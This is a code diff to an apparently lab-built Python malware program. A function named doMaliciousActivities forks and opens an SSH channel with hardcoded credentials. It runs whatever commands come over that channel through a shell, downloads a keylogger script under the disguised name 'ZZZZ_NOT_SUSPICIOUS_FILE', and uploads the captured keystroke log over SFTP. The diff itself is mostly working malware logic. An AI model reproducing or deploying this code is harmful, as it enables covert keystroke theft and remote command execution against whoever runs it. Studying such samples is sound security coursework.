@@ -20,7 +20,6 @@ class sftpClient(object):
         self.port = port
         self.username = username
         self.password = password
-        self.command = None
 
     def makeSFTPConnection(self):
         try:
@@ -50,7 +49,7 @@ class sftpClient(object):
         try:
             # connect to SFTP server
             self.makeSFTPConnection()
-            self.sftp.put(remotePath,  localPath)
+            self.sftp.put(localPath, remotePath)
 
             # Close
             if self.sftp:
@@ -92,6 +91,7 @@ class sshClient(object):
         self.port = port
         self.username = username
         self.password = password
+        self.command = ""
 
     # make a connection to a remote SSH server
     def makeSSHConnection(self):
@@ -120,13 +120,12 @@ class sshClient(object):
             logger.error(f'Exception has ocurred:{err}')
             self.ssh.close()
 
-    def thread_function(self):
-        logger.info("Thread starting")
-        self.command = self.channel.recv(1024).decode()
-        logger.info(f"Received 2nd message {self.command}")
-        # p = subprocess.Popen(self.command, shell=True,
-        #                      stdout=subprocess.PIPE)
-        logger.info("Thread finishing",)
+    def stopKeylogger(self):
+        logger.info("stopKeylogger() thread starting")
+        self.invoke_shell()
+        self.command = "stop"
+        logger.info(f"Received essage {self.command}")
+        logger.info("stopKeylogger() thread finishing",)
 
     def invoke_shell(self):
         try:
@@ -136,27 +135,12 @@ class sshClient(object):
             logger.info("Calling invoke shell")
             logger.info("Invoke shell called")
 
-            # keylog start
-            self.command = self.channel.recv(1024).decode()
-            logger.info(f"Received message {self.command}")
-            p = subprocess.Popen(self.command, shell=True,
+            command = self.channel.recv(1024).decode()
+            logger.info(f"Received message {command}")
+            p = subprocess.Popen(command, shell=True,
                                  stdout=subprocess.PIPE)
 
-            self.channel.sendall(p.communicate()[0])
-
-            logger.info("Main    : before creating thread")
-            x = threading.Thread(
-                target=self.thread_function, daemon=True)
-            logger.info("Main    : before running thread")
-            x.start()
-
-            while self.command != "stop":
-                logger.info("Sleeping . . . ")
-                time.sleep(5)
-                logger.info(f"Command: {self.command}")
-                logger.info("Awake!")
-
-            x.join()
+            self.channel.sendall(command.encode())
 
             self.channel.close()
             self.ssh.close()
@@ -176,7 +160,9 @@ class sshClient(object):
 def doMaliciousActivities():
 
     remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
+    remotepath2 = "/home/lab/bin/py/project/keyLogger.log"
     localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"
+    localpath2 = "/tmp/keylog.log"
     try:
         pid = os.fork()
         if pid == 0:
@@ -189,13 +175,30 @@ def doMaliciousActivities():
             ssh = sshClient("localhost", 9000, "rick", "jacky")
             ssh.invoke_shell()
 
+            logger.info("Main before creating thread")
+            stopKeyloggerThread = threading.Thread(
+                target=ssh.stopKeylogger, daemon=True)
+            logger.info("Main before running thread")
+            stopKeyloggerThread.start()
+
+            while ssh.command != "stop":
+                logger.info("Sleeping . . . ")
+                time.sleep(4)
+                logger.info(f"Command: {ssh.command}")
+                logger.info("Awake!")
+
+            stopKeyloggerThread.join()
+
+            sftp.uploadFile(remotepath2, localpath2)
+
         # kill child process
         while True:
             try:
                 pid,  status = os.waitpid(-1,  os.WNOHANG)
             except OSError:
                 break
-    except Exception:
+    except Exception as e:
+        logger.error(f"Error: {e}")
         raise
 
 
@@ -226,4 +229,4 @@ if __name__ == '__main__':
         printNonMaliciousActivity()
         doMaliciousActivities()
     except Exception as err:
-        print(err)
+        logger.error(err)
